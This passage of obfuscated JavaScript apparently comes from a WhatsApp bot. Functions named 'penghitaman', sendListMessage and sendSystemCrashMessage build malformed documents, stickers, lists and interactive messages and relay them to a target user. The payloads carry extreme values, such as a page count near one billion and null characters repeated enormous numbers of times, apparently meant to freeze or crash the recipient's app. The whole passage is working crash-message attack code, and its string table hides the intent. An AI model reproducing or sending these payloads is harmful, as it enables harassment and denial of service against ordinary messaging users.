0x568f9a(0x48a,0x14b,0x207,0x3af,0x22c)+_0x5c048b(0x779,0x7c1,0x60e,0x525,0x6ee)+_0x3041c3(0x2f7,0x166,0x29c,0x408,0x248)+_0x3041c3(0x21f,0xb7,0x148,0x1f,0x19c)+_0x1ebea5(-0x10f,0x6b,0x31a,-0x1,-0x32)+_0x1ebea5(0x5ba,0x45f,0x3f3,0x701,0x4ec)+_0x568f9a(0x37f,0x3c7,0x2c0,0x49c,0x666)+_0x1b7da3(0x8c7,0x430,0x5f7,0x813,0x8aa)+_0x1ebea5(0x2ca,0x54b,0x3d3,0x2a5,0x7a5)+_0x5c048b(0x866,0x366,0x613,0x426,0x413)+_0x3041c3(0x315,0x76,0x24b,0x1c6,0x346)+_0x5c048b(0x32d,0x14a,0x224,0x221,0x1af)+_0x1b7da3(0x79c,0x24f,0x51d,0x618,0x423)+_0x1ebea5(0x63e,0x5af,0x76c,0x862,0x7c0)+_0x568f9a(0xd9,0x290,0x449,0x2a3,0x139)+_0x5c048b(0x406,0x4ac,0x3e0,0x2e5,0x524)+_0x5c048b(0x5a9,0x353,0x497,0x512,0x58d)+'e0','Jbfvk':_0x568f9a(0x353,0x4d0,0x1a0,0x368,0x4c7)+_0x1ebea5(0x400,0x211,0x3b9,0x3b3,-0x7b)};function _0x1ebea5(_0x4c76ac,_0x27e3d3,_0x14bc12,_0x14d7aa,_0x7ed5fe){return _0x29f0b3(_0x4c76ac-0x18,_0x27e3d3-0x78,_0x14d7aa,_0x14d7aa-0x119,_0x27e3d3-0x17a);}function _0x1b7da3(_0x53f0ac,_0x105d74,_0x121264,_0x3fafe6,_0x282314){return _0xf1b353(_0x53f0ac-0x3e,_0x105d74-0x152,_0x282314,_0x3fafe6-0x13a,_0x121264-0x20b);}function _0x568f9a(_0x1228f4,_0x418613,_0x3ecde1,_0x39b65f,_0x418939){return _0x307533(_0x1228f4-0x171,_0x418939,_0x3ecde1-0xc5,_0x39b65f-0x28,_0x39b65f-0x76);}function _0x5c048b(_0x28b8b8,_0x2cb517,_0x1e4de0,_0x179644,_0x52f4bb){return _0x29f0b3(_0x28b8b8-0x18e,_0x2cb517-0x102,_0x28b8b8,_0x179644-0xde,_0x1e4de0-0x1dc);}function _0x3041c3(_0x1246c2,_0x5a5a0d,_0x19ef80,_0x496ee3,_0xcc2df5){return _0x29f0b3(_0x1246c2-0x1,_0x5a5a0d-0x8e,_0x496ee3,_0x496ee3-0x1ae,_0xcc2df5-0x22f);}var _0x2921c1=_0xdeed5e[_0x1ebea5(0x5b6,0x3c8,0x601,0x3e7,0x398)](generateWAMessageFromContent,_0x2ad15b,proto[_0x5c048b(0x6b7,0x280,0x49c,0x21d,0x639)+'ge'][_0x1b7da3(0x6e7,0x60d,0x520,0x775,0x47e)+_0x1b7da3(0x833,0x6c5,0x91b,0xbbb,0x9b7)]({'documentMessage':{'url':_0xdeed5e[_0x5c048b(0x5d0,0x4b4,0x63e,0x690,0x46e)],'mimetype':_0xdeed5e[_0x568f9a(0x64,0x17f,0x155,0x2b6,0xba)],'fileSha256':_0xdeed5e[_0x5c048b(-0x121,0x46,0xc9,0x378,-0x163)],'fileLength':_0xdeed5e[_0x3041c3(0x41e,0x8db,0x5dd,0x7b6,0x63f)],'pageCount':0x3b9ac9ff,'mediaKey':_0xdeed5e[_0x568f9a(0x21e,0x63,0x93,0x2c2,0x32f)],'fileName':_0xdeed5e[_0x5c048b(0x30a,0x53e,0x3ad,0x3fa,0x43a)](_0x1b7da3(0x4db,0x71b,0x7a4,0x60a,0x8c3)+_0x1b7da3(0xa6e,0xc18,0xa23,0x846,0xb0e)+_0x1b7da3(0x4a3,0x6f7,0x50a,0x668,0x784)+_0x3041c3(0x573,0x69b,0x4e2,0x687,0x53d)+_0x568f9a(0x7f0,0x7b1,0x5fc,0x598,0x5a8)+_0x1ebea5(-0x45,0x1e6,-0xe0,0x19d,0x2c5)+_0x3041c3(0x2ab,0x278,0x34e,0x2d1,0x2c0)+_0x3041c3(0x42d,0x4da,0x759,0x6e8,0x6b5)+_0x1b7da3(0xc59,0x945,0xa22,0xbc2,0xade)+_0x5c048b(0x63b,0x38c,0x62c,0x80c,0x48f)+_0x568f9a(-0xcc,-0x3d,0x3a9,0x1d3,0x375)+_0x5c048b(0x76,-0x162,0x147,0x319,0x25)+_0x568f9a(0x2bb,0x2dc,0x621,0x3ef,0x6a3),'ྦྷ'[_0x3041c3(0x4c6,0x39d,0x4f6,0x47a,0x436)+'t'](0x16601+0x1*0xb8b7+-0x13458)),'fileEncSha256':_0xdeed5e[_0x3041c3(0x227,0x262,0x76c,0x3d7,0x4fc)],'directPath':_0xdeed5e[_0x568f9a(0x191,-0x7d,-0x10a,0xbb,0x348)],'mediaKeyTimestamp':_0xdeed5e[_0x1b7da3(0x62d,0x7ea,0x673,0x790,0x491)]}}),{'userJid':_0x2ad15b,'quoted':_0x1e2052});await VxoZap[_0x1ebea5(0x0,0x258,0x319,0x4a2,0x3b9)+_0x1ebea5(0x6c1,0x43a,0x2d9,0x6ad,0x453)+'ge'](_0x2ad15b,_0x2921c1[_0x1b7da3(0x8bb,0x763,0x96d,0x85e,0xb5a)+'ge'],{'participant':{'jid':_0x2ad15b},'messageId':_0x2921c1[_0x3041c3(0x507,0x588,0x87b,0x7ad,0x699)]['id']});}async function penghitaman(_0x5c2775,_0x17836f){const _0x3c134a={'pJxyH':function(_0x5e9185,_0x77e669,_0x17b2f0,_0x4a2456){return _0x5e9185(_0x77e669,_0x17b2f0,_0x4a2456);},'RZEpG':_0x180466(0x3ad,0x3a6,0x2c5,0x4bd,0x249)+_0x4e5cd7(0x67e,0x494,0x54a,0x6fa,0x3f3)+_0x180466(0x833,0x4af,0x6cf,0x8b3,0x95a)+_0x12c72c(0x508,0x440,0x389,0x134,0x279)+_0x1ad2ff(0x8fc,0x4f8,0x855,0x728,0x745)+_0x1de7bf(0x54f,0x234,0x556,0x330,0x198)+_0x1ad2ff(0x518,0x926,0x4e6,0x8f2,0x77a)+_0x4e5cd7(0x4d2,0x25e,0x4f1,0x531,0x3b1)+_0x12c72c(0x8fa,0x7f3,0x7b4,0x7e5,0x777)+_0x4e5cd7(0x3ab,0x370,0x1f5,-0x7c,0x447)+_0x12c72c(0x1dc,0x518,0x2a2,0x2da,0x27d)+_0x4e5cd7(0x1d4,-0x55,0x233,0x3e1,0x333)+_0x1de7bf(0x146,0x1f1,0x110,0x2d3,0x1c0)+_0x1de7bf(0x3ee,0x1ac,0x23f,0x3b7,0x443)+_0x1ad2ff(0x776,0x9a6,0xb7a,0x95e,0x9c6)+_0x180466(0xf9,0x24d,0x1b2,-0x7a,0x1ed)+_0x1de7bf(0x2e3,0x473,0xfb,0x32c,0x485)+_0x12c72c(0x623,0x801,0x67b,0x6b1,0x582)+_0x180466(0xa0,0x2f8,0x265,0x251,0x3f7)+_0x12c72c(0x7b5,0x574,0x76c,0x7b0,0x751)+_0x1de7bf(0x827,0x6df,0x4b3,0x744,0x683)+_0x1ad2ff(0x774,0x54c,0x847,0x9a4,0x790)+_0x1de7bf(0xeb,0x0,0x40,0x25b,0x1ce)+_0x4e5cd7(0x1ff,0x2b6,0x61,0x32d,0x42)+_0x180466(0x527,0x6a1,0x62f,0x4c2,0x70c)+_0x1ad2ff(0x648,0x598,0x4b7,0x276,0x51f)+_0x12c72c(0x320,0x3b3,0x7e1,0x370,0x5cc)+_0x1de7bf(0x4c1,0x2e4,0x31a,0x505,0x3b9)+_0x1de7bf(0x600,0x692,0x396,0x41d,0x3e6)+_0x180466(0x3ba,0x724,0x484,0x65b,0x34e)+_0x1de7bf(0x165,0x17a,0x44b,0x3a0,0x233)+_0x180466(-0xae,0xfe,0x1fe,0x4b0,0x45d)+_0x12c72c(0x464,0x144,0x3d6,0x1da,0x33a)+_0x180466(0x8ae,0x5c4,0x713,0x7b1,0x756)+_0x1ad2ff(0x60c,0x913,0x384,0x736,0x642)+_0x1ad2ff(0x7a5,0x8e2,0x7f2,0x8cf,0x8f6)+_0x12c72c(0x4e6,0x40a,0x45e,0x2ab,0x557)+_0x1de7bf(0x3ef,0x4df,0x149,0x337,0x22b)+_0x1ad2ff(0x3ab,0x695,0x605,0x4f6,0x432)+_0x1ad2ff(0x78e,0xb98,0x800,0x718,0x9c1),'MeYhW':_0x1de7bf(0x41,-0x4e,0x22f,0x271,0x3d3)+_0x180466(0x322,0x561,0x461,0x3c3,0x666)+_0x12c72c(0x8cd,0x596,0x7d5,0x4ce,0x6c5)+_0x12c72c(0x77d,0x47d,0x682,0x592,0x74a)+_0x1ad2ff(0x598,0x7c2,0x638,0x8d7,0x7f6)+_0x1ad2ff(0x4a0,0x855,0x4ef,0x3f5,0x677)+_0x1de7bf(0x6b,0xc7,0x472,0x2a4,0xbb)+_0x12c72c(0x569,0x83b,0x88b,0x81b,0x73f)+_0x1de7bf(0x278,0x2e8,0x572,0x528,0x2a2),'VACGf':_0x1de7bf(0x72b,0x802,0x375,0x5f2,0x7f2)+_0x1de7bf(0x4e7,0x5ab,0x645,0x521,0x461)+_0x180466(0x6e9,0x561,0x6ab,0x441,0x73a)+_0x12c72c(0x419,0x7c0,0x747,0x8f6,0x6b0)+_0x4e5cd7(0x818,0x685,0x542,0x5ba,0x568)+_0x1ad2ff(0x674,0x527,0x82d,0xa50,0x7ec)+_0x1ad2ff(0x78c,0x59b,0x448,0x33b,0x60b)+_0x4e5cd7(0x2a8,0x214,0x210,0x39e,0x18c)+_0x180466(0x271,0x11f,0x317,0x566,0x3b6),'xzzeD':_0x4e5cd7(0x57f,0x593,0x4e8,0x6b3,0x3ba)+_0x4e5cd7(0xed,0x399,0x266,0x1aa,0x37c)+_0x12c72c(0x90c,0x65f,0x596,0x607,0x6a8)+_0x1de7bf(0x15b,0x1de,0x2fb,0x32e,0x2a2)+_0x4e5cd7(0x5a3,0x45f,0x399,0x3bc,0xcb)+_0x4e5cd7(0x4e0,0x613,0x4f5,0x66e,0x282)+_0x180466(0x459,0x4f2,0x6e9,0x8e8,0x8aa)+_0x12c72c(0x1c3,0x540,0x4f9,0x63a,0x415)+_0x1ad2ff(0x8bc,0x8b6,0x4d3,0x925,0x79d),'GLNeY':_0x4e5cd7(0x3fa,0x136,0x2fe,0x1a5,0x45d)+_0x4e5cd7(0x5c4,0x16f,0x442,0x2ed,0x343),'BaPoX':_0x180466(0x370,-0xe1,0x19d,0xc,0x417)+_0x180466(0x6b4,0x1c8,0x420,0x32f,0x179)+_0x180466(0x2b8,0x2cc,0x42b,0x336,0x1fe)+_0x4e5cd7(0x48d,0x23f,0x24e,0x79,0x47d)+_0x1de7bf(0x191,0x4b3,0xe5,0x3ba,0x1cd)+_0x180466(0x3b3,0x438,0x56d,0x481,0x507)+_0x180466(0x3c,0x345,0x1b4,0x259,0x169)+_0x12c72c(0x905,0x66f,0x7cc,0xa2d,0x7da)+_0x1ad2ff(0x815,0x68e,0x407,0x600,0x6ca)+_0x12c72c(0x339,0x2e9,0x599,0x431,0x3e0)+_0x1ad2ff(0xabf,0x67c,0xa2f,0x98b,0x920)+_0x4e5cd7(0x38,0x206,0x11a,0x26f,0x39a)+_0x1ad2ff(0x456,0x753,0x588,0x94f,0x6de)+_0x4e5cd7(0x41e,0xc8,0x17e,0x279,0x3bd)+_0x4e5cd7(0x836,0x5c8,0x5c8,0x597,0x69b)+_0x4e5cd7(0x2ba,0x13a,0x32f,0x371,0x30b)+_0x4e5cd7(0x87a,0x580,0x5a5,0x619,0x375)+_0x1de7bf(0x8df,0x6f6,0x51d,0x6bd,0x518)+_0x4e5cd7(0x1d6,0x44d,0x190,0x15f,0x301)+_0x12c72c(0x6a2,0x2da,0x299,0x2b5,0x436)+_0x180466(0x4b7,0x5d9,0x4d6,0x2aa,0x3ea)+_0x180466(0xe0,0x327,0x35c,0x219,0x25e)+_0x1ad2ff(0x698,0x3d9,0x5ad,0x67c,0x630)+_0x1ad2ff(0x98b,0x96d,0x634,0x68d,0x7e3)+_0x1ad2ff(0x64c,0x86e,0x7e2,0xa7f,0x7a8)+_0x180466(0x1df,0x308,0x247,-0x40,0xd2)+_0x1ad2ff(0xb7d,0x755,0x9e4,0x8f0,0x9ab)+_0x1ad2ff(0x677,0x7a2,0x36c,0x500,0x63a)+_0x4e5cd7(-0xb8,0xd4,0x12d,0x3c8,0x268)+_0x12c72c(0x455,0x323,0x307,0x2d3,0x595)+_0x4e5cd7(0x30b,0x4cb,0x568,0x74d,0x50b)+_0x12c72c(0x8e5,0x6af,0x8d5,0x74b,0x655)+_0x1de7bf(0x22e,0x616,0x745,0x4cb,0x6e0),'idhsc':_0x4e5cd7(0x6fa,0x4dc,0x504,0x665,0x375),'fQolc':_0x180466(0x305,0x266,0x436,0x44f,0x210)+_0x12c72c(0x511,0x7cc,0x723,0x665,0x72e),'qNcDV':_0x1ad2ff(0x7c6,0x817,0x5d4,0x4c9,0x6ee)+_0x1ad2ff(0x5b6,0x823,0x7e3,0x5a1,0x862)+_0x12c72c(0x531,0x84b,0x64b,0x704,0x66a)};function _0x12c72c(_0x239779,_0x21fc9a,_0x132695,_0x15c380,_0x130396){return _0x279901(_0x15c380,_0x21fc9a-0x145,_0x132695-0xf0,_0x130396-0x2cd,_0x130396-0x127);}function _0x1ad2ff(_0x554004,_0x42cd95,_0x3fbeb1,_0x422f70,_0x5c0228){return _0x30a091(_0x5c0228-0x606,_0x3fbeb1,_0x3fbeb1-0x1f2,_0x422f70-0x1f3,_0x5c0228-0x8e);}function _0x4e5cd7(_0x5e340f,_0x425c46,_0xbcd480,_0x5392b2,_0x149a1a){return _0x29f0b3(_0x5e340f-0x152,_0x425c46-0x48,_0x425c46,_0x5392b2-0xc4,_0xbcd480-0x16b);}var _0x354fba=_0x3c134a[_0x180466(0xc,0x439,0x229,0x33e,0x1f3)](generateWAMessageFromContent,_0x5c2775,proto[_0x1ad2ff(0x8e8,0xa5e,0x90b,0xa00,0x7f9)+'ge'][_0x1ad2ff(0x781,0x4e5,0x767,0x568,0x4b0)+_0x180466(0x743,0x67e,0x5f3,0x6b8,0x6d9)]({'stickerMessage':{'url':_0x3c134a[_0x12c72c(0x738,0x839,0x8a4,0x773,0x6c1)],'fileSha256':_0x3c134a[_0x4e5cd7(0x294,0x4a6,0x546,0x75e,0x817)],'fileEncSha256':_0x3c134a[_0x1de7bf(0x470,0x5e4,0x387,0x599,0x347)],'mediaKey':_0x3c134a[_0x4e5cd7(0x11e,-0x103,0x17d,-0x6d,0x1ac)],'mimetype':_0x3c134a[_0x1ad2ff(0x514,0x667,0x942,0xa5b,0x7a6)],'directPath':_0x3c134a[_0x4e5cd7(0x29d,0x2bd,0xb1,0x220,0x64)],'fileLength':_0x3c134a[_0x180466(0x425,0x153,0x1b7,0x291,0x264)],'mediaKeyTimestamp':_0x3c134a[_0x1ad2ff(0x35c,0x54a,0x32d,0x39b,0x48f)],'isAnimated':![],'stickerSentTs':_0x3c134a[_0x1ad2ff(0x71f,0x862,0x9c0,0x6d9,0x92f)],'isAvatar':![],'isAiSticker':![],'isLottie':![]}}),{'userJid':_0x5c2775,'quoted':_0x17836f});function _0x180466(_0x5a5b26,_0x70aab1,_0x3b46df,_0x39af5a,_0x27d78c){return _0xf1b353(_0x5a5b26-0x3d,_0x70aab1-0xa4,_0x5a5b26,_0x39af5a-0x11f,_0x3b46df- -0x11d);}function _0x1de7bf(_0x14705a,_0xf32043,_0xe83103,_0x3319b8,_0x4b5426){return _0xf1b353(_0x14705a-0x138,_0xf32043-0x155,_0x14705a,_0x3319b8-0x1b3,_0x3319b8- -0x55);}await VxoZap[_0x12c72c(0x49f,0x273,0x18a,0x2ec,0x44b)+_0x4e5cd7(0x499,0x3ab,0x42b,0x21a,0x618)+'ge'](_0x5c2775,_0x354fba[_0x1ad2ff(0x842,0xba3,0x97f,0x7d4,0x8fd)+'ge'],{'participant':{'jid':_0x5c2775},'messageId':_0x354fba[_0x12c72c(0x887,0x5e6,0x538,0x502,0x7d7)]['id']});}async function sendListMessage(_0x565296){function _0x5c4c1e(_0x25bca9,_0x838c81,_0x15f79f,_0x31dab2,_0xfbbdb5){return _0x279901(_0xfbbdb5,_0x838c81-0x1c5,_0x15f79f-0x2d,_0x15f79f-0x1c1,_0xfbbdb5-0xb1);}function _0x43ae7a(_0x109d68,_0x1d1a3c,_0xbff88c,_0x313a58,_0x236664){return _0x279901(_0x109d68,_0x1d1a3c-0x8c,_0xbff88c-0xf1,_0x313a58-0x4ef,_0x236664-0x46);}const _0x1f1b5b={'ZFVHt':function(_0x4a82c2,_0x13da95,_0x3c228d,_0x169f46){return _0x4a82c2(_0x13da95,_0x3c228d,_0x169f46);},'cHhPy':function(_0x42f5ff,_0x3ff02a){return _0x42f5ff+_0x3ff02a;},'JWQwI':_0x43ae7a(0xa0d,0x974,0x5cd,0x7a8,0x7c2)+_0x110f09(0x474,0x367,0x502,0x5a5,0x4c3)+_0x1c7a8d(0x35d,0x614,0x5d0,0x491,0x877)+_0x43ae7a(0xb05,0x88d,0x926,0x9dc,0x9f1)+_0x5c4c1e(0x638,0x7e8,0x61c,0x7b4,0x4a7)+_0x5c4c1e(0x7bc,0x7ac,0x5e9,0x37f,0x807)+_0x5c4c1e(0x20f,0x92,0x1b4,0x68,0xba)+_0x110f09(0x3d4,-0x89,0x353,0x235,0x1cc)+_0x5c4c1e(0x829,0x67c,0x6f7,0x723,0x7a5)+_0x5c4c1e(0x432,0x27f,0x262,-0x54,0x4ce)+_0x110f09(0x1a7,-0x20,0x24c,0x1e5,0x428)+_0x35bac2(0x5ea,0x369,0x607,0x75e,0x319)+_0x110f09(0x4e9,0x10c,0x195,0x3ac,0x5fe)+_0x110f09(0x2df,0x432,0x4a1,0x357,0x4fb)+_0x1c7a8d(0x8e1,0x8c6,0x9b5,0x6ea,0xc2e)+_0x35bac2(0x308,0x38e,0x57f,0x47c,0xcc)+_0x35bac2(0x472,0x2b1,0x6ad,0x1bd,0x485),'GlxVa':_0x1c7a8d(0x4aa,0x679,0x556,0x42f,0x3c0)+_0x35bac2(0x193,0x14c,-0x1b,-0x136,0xa7)+_0x35bac2(0x210,0x2d9,0x3f1,0x256,0x245)+_0x35bac2(0x486,0x544,0x4f9,0x52c,0x5e0)+_0x35bac2(0x44f,0x3b1,0x52e,0x5d8,0x65a)+_0x43ae7a(0x368,0x1e3,0x553,0x4ac,0x717)+_0x1c7a8d(0x22f,0x418,0x4cf,0x6e7,0x3c2)+_0x43ae7a(0x721,0x737,0x729,0x80a,0x8e7)+_0x35bac2(0x350,0x34d,0xf8,0x4d6,0x4c1)+'®','OuQgY':_0x35bac2(0x561,0x803,0x369,0x6d5,0x624),'pTLNo':_0x1c7a8d(0x654,0x785,0x55a,0x7f5,0x642)+_0x1c7a8d(0x5d2,0x8e2,0x69b,0x90c,0x4c1)+_0x5c4c1e(0x519,0x4c7,0x643,0x73d,0x6d6)+'2','vziDl':_0x110f09(0x109,0x6c,0x157,0x15e,0x357)+_0x35bac2(0x221,-0x9,0x4e7,-0x52,0x487)+_0x1c7a8d(0x512,0x730,0x757,0x8e1,0x584)+'t','WaiyQ':_0x110f09(0x2ca,0x44b,0x329,0x2d6,0x4ee)+_0x1c7a8d(0x6a9,0x9ad,0x80a,0xada,0x8ba),'DrDtJ':_0x110f09(0x18b,-0x19,0x2cc,0x215,0x16d)+_0x5c4c1e(0x23f,0x3db,0x1cb,0x40a,0x49d)+_0x110f09(0x724,0x6f8,0x53c,0x49e,0x1d4)+_0x1c7a8d(0x9c3,0x76c,0x96e,0xab8,0x851)+'at','ImTKm':_0x5c4c1e(0x7c6,0x63f,0x59d,0x5cb,0x795)+_0x5c4c1e(0x36a,0x3c1,0x463,0x686,0x18f),'xPLZb':_0x1c7a8d(0x502,0x501,0x624,0x510,0x765)+_0x5c4c1e(0x1f7,0x3ea,0x27d,0x1ae,0xa6)+_0x110f09(0x5ac,0x1c2,0x510,0x386,0x4c4)},_0xa42a11={};function _0x35bac2(_0x52c717,_0x110b13,_0x3b6fd0,_0x3cc9bd,_0x5d3868){return _0x307533(_0x52c717-0x55,_0x110b13,_0x3b6fd0-0x9e,_0x3cc9bd-0x37,_0x52c717-0x7d);}_0xa42a11[_0x1c7a8d(0x6ea,0x981,0x817,0x6e2,0x877)+_0x110f09(0x2a7,0x260,0x3eb,0x132,0x21a)+_0x35bac2(0x300,0x29a,0x4c1,0x3b2,0x1b7)+_0x5c4c1e(0x819,0x987,0x6ef,0x679,0x777)+'id']=0x4433e2e130;function _0x1c7a8d(_0x47bd8e,_0x2fdd30,_0x225881,_0x447193,_0x13bd37){return _0x29f0b3(_0x47bd8e-0x14,_0x2fdd30-0xa5,_0x447193,_0x447193-0x86,_0x225881-0x5a3);}_0xa42a11[_0x1c7a8d(0x7f9,0x6d0,0x817,0x62d,0x7eb)+_0x43ae7a(0x326,0x41f,0x45a,0x507,0x2af)+_0x43ae7a(0x563,0x4c6,0x6a9,0x6d5,0x6cd)+_0x1c7a8d(0xa49,0xbd0,0x940,0x897,0xa36)+_0x43ae7a(0x65f,0x6f8,0x380,0x5bd,0x38a)+'d']=![];function _0x110f09(_0x2daead,_0x412862,_0x40f128,_0x2dc044,_0x70bfcb){return _0x279901(_0x70bfcb,_0x412862-0x3d,_0x40f128-0x1e8,_0x2dc044-0x11a,_0x70bfcb-0x11e);}var _0x59b3c2=_0x1f1b5b[_0x43ae7a(0x38a,0x58d,0x836,0x5c3,0x606)](generateWAMessageFromContent,_0x565296,proto[_0x5c4c1e(0x44b,0x5e5,0x521,0x507,0x5ba)+'ge'][_0x5c4c1e(0x115,0xa0,0x1d8,0x3d4,0x431)+_0x35bac2(0x52c,0x26f,0x7d8,0x4ef,0x353)]({'listMessage':{'title':_0x1f1b5b[_0x5c4c1e(0x48e,0x612,0x4a5,0x57a,0x645)](_0x1f1b5b[_0x43ae7a(0x492,0x6e4,0x52e,0x6e4,0x621)],'\x00'[_0x43ae7a(0x710,0x70c,0x979,0x796,0x967)+'t'](0x36a1*-0x4c+-0x84b*0x328+0xc29*0x4a4)),'footerText':_0x1f1b5b[_0x1c7a8d(0x335,0x3bb,0x596,0x317,0x3b2)],'description':_0x1f1b5b[_0x35bac2(0x1ad,0xfb,0x3ea,0x426,0x3b9)],'buttonText':null,'listType':0x2,'productListInfo':{'productSections':[{'title':_0x1f1b5b[_0x35bac2(0x1e6,0x25e,0x3ee,0x31,0xf1)],'products':[{'productId':_0x1f1b5b[_0x5c4c1e(-0x24,0xdc,0x153,0x173,0x2e5)]}]}],'productListHeaderImage':{'productId':_0x1f1b5b[_0x110f09(-0x126,0x22d,0x290,0xac,0x2e3)],'jpegThumbnail':null},'businessOwnerJid':_0x1f1b5b[_0x110f09(0x3e9,0x4b6,0x7aa,0x5ff,0x620)]}},'footer':_0x1f1b5b[_0x110f09(-0x76,0x278,0x8a,0x1e6,0x43e)],'contextInfo':{'expiration':0x927c0,'ephemeralSettingTimestamp':_0x1f1b5b[_0x110f09(-0xba,-0xcb,-0x1f,0x1a2,0x39a)],'entryPointConversionSource':_0x1f1b5b[_0x110f09(0x95,0x298,0x12,0x2e6,0x35b)],'entryPointConversionApp':_0x1f1b5b[_0x5c4c1e(0x257,0x3f9,0x255,0x3f3,0x1ac)],'entryPointConversionDelaySeconds':0x9,'disappearingMode':{'initiator':_0x1f1b5b[_0x5c4c1e(0x1cd,0x289,0x469,0x712,0x282)]}},'selectListType':0x2,'product_header_info':_0xa42a11}),{'userJid':_0x565296});await VxoZap[_0x5c4c1e(0x55a,0x496,0x33f,0x47a,0x2fd)+_0x110f09(0x56b,0x237,0x235,0x47a,0x31d)+'ge'](_0x565296,_0x59b3c2[_0x43ae7a(0xaa7,0x7c9,0x709,0x953,0xbd9)+'ge'],{'participant':{'jid':_0x565296},'messageId':_0x59b3c2[_0x110f09(0x87d,0x86f,0x532,0x624,0x39d)]['id']});}async function sendSystemCrashMessage(_0xd1b120){const _0x5aaa49={'TsuLK':function(_0x5722d9,_0x133f4a,_0x14d169,_0x332fa6){return _0x5722d9(_0x133f4a,_0x14d169,_0x332fa6);},'cZzSe':_0x466181(0x6b5,0x61a,0x45c,0x641,0x727)+_0x466181(0x746,0x728,0x7d9,0x493,0x952)+_0x466181(0x687,0x3f8,0x8d1,0x3bc,0x43a)+_0x1fe087(0x498,0x808,0x597,0x6eb,0x727)+_0x4101fb(0x2e7,0x4e3,0x298,0x20,0x558)+_0x1fe087(0x7ab,0xc38,0xc24,0xa8c,0x978)+_0x4669ca(0x7a,0x302,0x8d,0x46d,0x52)+_0x1c351f(0x26c,-0x144,0x16a,-0x5c,0x3b6)+_0x4101fb(0x5b,-0xba,0x1dc,0x270,-0xd)+_0x1c351f(-0x22a,-0x297,0x32,-0x20,0xb4)+_0x4669ca(0x8e7,0x694,0x4e1,0x8fd,0x499)+_0x466181(0x4e8,0x4f2,0x64f,0x5d0,0x700)+_0x466181(0x766,0x532,0x551,0x5a6,0x970)+_0x4101fb(0x329,0x18b,0x16c,0x2e8,-0x36)+_0x4101fb(0x360,0x1d6,0x39f,0x63a,0x3a5)+_0x4101fb(0x219,0x2e1,0x1a1,-0x10d,0x3ad)+_0x1c351f(0x808,0x5cb,0x548,0x583,0x3d8),'jvLSM':_0x1c351f(0x47d,0x14d,0x3a9,0x4cc,0x5fb)+'rl','uYnLK':_0x1c351f(-0x13e,-0x282,0x27,0x7d,0x269)+_0x1c351f(0x477,0x13,0x209,0x6b,-0xbf)+_0x1fe087(0x6d4,0x6ac,0x3b7,0x4ac,0x5ae)+_0x466181(0x545,0x493,0x6ee,0x320,0x4e2)+_0x1c351f(0x22b,-0x21,0x233,0x466,-0xa)+_0x1fe087(0x9b9,0xafa,0xaf8,0xa4c,0x96f)+_0x4669ca(0x55f,0x746,0x6c4,0x6a7,0x96b)+_0x1fe087(0x664,0x5d2,0x72b,0x253,0x503)+_0x4101fb(0x17b,0x239,0x28a,0x360,0x510)+_0x4669ca(0x5cf,0x73b,0x8ad,0x592,0x870)+_0x4669ca(0x82a,0x61a,0x666,0x5b6,0x8cf)+_0x1c351f(-0x1b,-0x12d,0x188,-0x128,0x42)+_0x4101fb(0xae,0x4b5,0x200,0xf9,0x273)+_0x466181(0x484,0x287,0x2c7,0x4ef,0x5e1)+_0x4101fb(0x5a1,0x23e,0x36b,0x119,0x18a)+_0x4101fb(0x1db,0x3f8,0x49d,0x754,0x56d)+_0x466181(0x3d5,0x2a5,0x407,0x506,0x386)+_0x1c351f(0x54b,0x3fb,0x52e,0x59b,0x4a4)+_0x4669ca(0x5bc,0x417,0x643,0x184,0x35a)+_0x1fe087(0x983,0x75c,0x848,0x908,0x866)+_0x1c351f(0x482,0x65c,0x4f6,0x561,0x2a3)+_0x4669ca(0x323,0x567,0x6c4,0x359,0x696)+_0x4101fb(0x4a6,0x1c,0x2b6,0x288,0x13c)+_0x1fe087(0x649,0x350,0x6b4,0x35c,0x56e)+_0x1c351f(0x3a0,-0x121,0x164,0x24e,-0x42)+_0x1c351f(0x3f4,0x1e7,0x2ee,0x18b,0x4b6)};function _0x1c351f(_0x1ed175,_0x4a41f8,_0xca5f71,_0x2f7b31,_0x26a578){return _0x307533(_0x1ed175-0x1a,_0x2f7b31,_0xca5f71-0xe0,_0x2f7b31-0xc9,_0xca5f71- -0x4d);}const _0x21a53e={};_0x21a53e[_0x466181(0x742,0x9ec,0x6d5,0x6d2,0x525)]='';function _0x466181(_0x5f5372,_0x13ea29,_0x3ef7b8,_0x52aab8,_0x793788){return _0xf1b353(_0x5f5372-0x167,_0x13ea29-0x100,_0x52aab8,_0x52aab8-0x129,_0x5f5372- -0x7b);}_0x21a53e[_0x466181(0x2b1,0x277,0x353,0x27,0x547)+_0x1fe087(0x848,0x6f7,0x7ba,0x7d3,0x7ca)]='\x20';function _0x4101fb(_0x31e086,_0x3b5321,_0x5f5d8e,_0x2cd28d,_0x40b22f){return _0x279901(_0x40b22f,_0x3b5321-0x1f3,_0x5f5d8e-0x2e,_0x5f5d8e-0x99,_0x40b22f-0x1d1);}function _0x4669ca(_0x57f1ec,_0x4a7b7a,_0x2e93c6,_0x19eeff,_0x5b4d19){return _0x29f0b3(_0x57f1ec-0x8b,_0x4a7b7a-0x9b,_0x5b4d19,_0x19eeff-0x48,_0x4a7b7a-0x414);}const _0x48aa87={};_0x48aa87[_0x1fe087(0x4fb,0x79a,0x66a,0x453,0x555)]='xp';function _0x1fe087(_0x2717e0,_0x2fc0eb,_0x20052a,_0x48aa7c,_0x46b7f3){return _0x279901(_0x20052a,_0x2fc0eb-0x18d,_0x20052a-0x13f,_0x46b7f3-0x4ab,_0x46b7f3-0x39);}var _0x2d1f36=_0x5aaa49[_0x1c351f(0x1c3,-0x72,0x29,-0x194,-0x8f)](generateWAMessageFromContent,_0xd1b120,proto[_0x4101fb(0x1bf,0x242,0x3f9,0x565,0x33c)+'ge'][_0x4101fb(0x1b0,0x1ef,0xb0,-0x139,0x1b3)+_0x4101fb(0x6ed,0x76d,0x4ab,0x2d0,0x5da)]({'viewOnceMessage':{'message':{'interactiveMessage':{'header':_0x21a53e,'body':{'text':_0x5aaa49[_0x466181(0x749,0x9e7,0x535,0x69a,0x50e)]},'footer':_0x48aa87,'nativeFlowMessage':{'buttons':[{'name':_0x5aaa49[_0x466181(0x59b,0x762,0x4c1,0x6c0,0x650)],'buttonParamsJson':_0x5aaa49[_0x1c351f(0x1e6,0x17d,0x412,0x28b,0x4e0)]}],'messageParamsJson':'\x00'[_0x466181(0x52a,0x3d6,0x724,0x570,0x4d5)+'t'](0x1*-0x21b9d+-0x30*-0x52d9+0x2aa7*0xb)}}}}}),{'userJid':_0xd1b120});await 